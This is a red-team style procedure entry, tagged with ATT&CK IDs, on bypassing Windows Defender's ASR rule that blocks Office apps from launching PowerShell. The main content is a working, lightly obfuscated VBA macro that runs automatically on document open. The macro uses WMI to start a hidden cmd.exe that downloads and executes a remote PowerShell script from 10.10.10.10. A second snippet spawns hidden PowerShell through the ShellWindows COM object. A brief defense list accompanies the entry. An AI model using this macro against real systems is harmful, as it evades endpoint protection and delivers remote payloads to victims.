---
id: 350c693a-0bde-4797-a7c5-fc0421e79757
name: Bypass-ASR-Rule-5-via-WMI-to-Execute-PowerShell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:23.591367+00:00'
updated_at: '2023-04-10T20:36:53.417749+00:00'
tactics:
  - '[[tactics/Defense-Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter-PowerShell|T1059.001 -
    Command and Scripting Interpreter: PowerShell]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques: []
tags:
  - '[[tags/DOCM - WMI COM functions]]'
  - '[[tags/Office - Attacks]]'
  - asr-bypass
  - wmi
  - powershell-execution
commands:
  - '[[commands/Launch-PowerShell-via-ShellExecute-VBS]]'
platforms:
  - Windows
tools: []
validated: true
---

# Bypass-ASR-Rule-5-via-WMI-to-Execute-PowerShell

## Summary

This procedure demonstrates a technique to bypass Windows Defender Attack Surface Reduction (ASR) Rule 5, which blocks Office applications from starting PowerShell processes directly, by using WMI COM functions to create a hidden child process that executes PowerShell via cmd.exe. This allows attackers to run PowerShell scripts, such as downloading and executing remote payloads, without triggering the ASR rule.

## Description

ASR Rule 5 prevents Office macros and scripts from spawning PowerShell to execute malicious code. This bypass leverages the Win32_Process WMI class to create a hidden cmd.exe child process that indirectly launches PowerShell using Invoke-WebRequest (IWR) and Invoke-Expression (IEX) to fetch and run a remote script. The technique is commonly used in Office macro attacks (e.g., VBA in Word/Excel) to evade detection and achieve code execution on Windows systems with ASR enabled. It requires WMI access and is effective against default configurations where ASR is active but WMI is not restricted. Success results in a hidden PowerShell session executing arbitrary code, enabling further post-exploitation like malware download or reconnaissance.

## Requirements

1. Administrative or user-level access to a Windows system with Office installed (e.g., Word, Excel).
2. WMI service enabled and accessible (default on Windows 10/11/Server).
3. Network access to a remote server hosting the PowerShell payload (e.g., stage.ps1).
4. ASR Rule 5 enabled to test the bypass (configurable via Windows Defender settings).

## Defense

- Enable and monitor ASR Rule 5 (Block Office applications from creating child processes) via Group Policy or Intune.
- Restrict WMI access using WMI namespaces permissions or tools like WMI Filter.
- Implement application whitelisting (e.g., AppLocker) to block unsigned macros and VBS execution.
- Monitor for anomalous process creation via WMI (Event ID 19 in Microsoft-Windows-WMI-Activity/Operational log) and PowerShell execution (Module/ScriptBlock logging).
- Use EDR solutions to detect hidden window processes and unexpected network fetches in Office contexts.

## Objectives

1. Bypass ASR Rule 5 to prevent blocking of PowerShell execution from Office applications.
2. Create a hidden child process to launch PowerShell indirectly via cmd.exe.
3. Download and execute a remote PowerShell script for further malicious activities.

## Instructions

### Step 1: Embed VBA Macro for WMI-Based Child Process Creation

**Context**: This step uses a VBA macro to invoke WMI and create a hidden cmd.exe process that executes PowerShell to download and run a remote script, bypassing ASR detection.

**Code** ([[codes/VBA-ASR-Bypass-via-WMI-Process-Creation]]):

```vba
Sub ASR_bypass_create_child_process_rule5()
    Const HIDDEN_WINDOW = 0
    strComputer = "."
    Set objWMIService = GetObject("win" & "mgmts" & ":\\" & strComputer & "\root" & "\cimv2")
    Set objStartup = objWMIService.Get("Win32_" & "Process" & "Startup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = HIDDEN_WINDOW
    Set objProcess = GetObject("winmgmts:\" & strComputer & "\root" & "\cimv2" & ":Win32_" & "Process")
    objProcess.Create "cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')", Null, objConfig, intProcessID
End Sub

Sub AutoExec()
    ASR_bypass_create_child_process_rule5
End Sub

Sub AutoOpen()
    ASR_bypass_create_child_process_rule5
End Sub
```

> This VBA code defines a subroutine to create a hidden process using WMI's Win32_Process.Create method. The cmd.exe invocation runs PowerShell with IEX and IWR to fetch and execute the remote script. AutoExec and AutoOpen ensure automatic execution when the Office document is opened or macros are enabled. Expected output: No visible window; verify via Process Explorer for hidden cmd/powershell processes and network traffic to the payload URL. If successful, the remote script (stage.ps1) executes without ASR blocking.

### Step 2: Alternative Launch of PowerShell via ShellExecute

**Context**: As a simpler bypass or fallback, use VBScript with ShellExecute to spawn cmd.exe and PowerShell indirectly, avoiding direct invocation that triggers ASR.

**Command** ([[commands/Launch-PowerShell-via-ShellExecute-VBS]]):

```vbscript
Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
Set SW = GetObject("new:" & ShellWindows).Item()
SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
```

> This VBScript uses the ShellWindows COM object to execute cmd.exe with the /c flag to run PowerShell from System32. The 0 parameter hides the window. Run as a .vbs file or embed in a macro. Expected output: A new PowerShell console opens (or hidden if configured); no ASR block if indirect. Verify by checking for powershell.exe process spawned from cmd.exe.
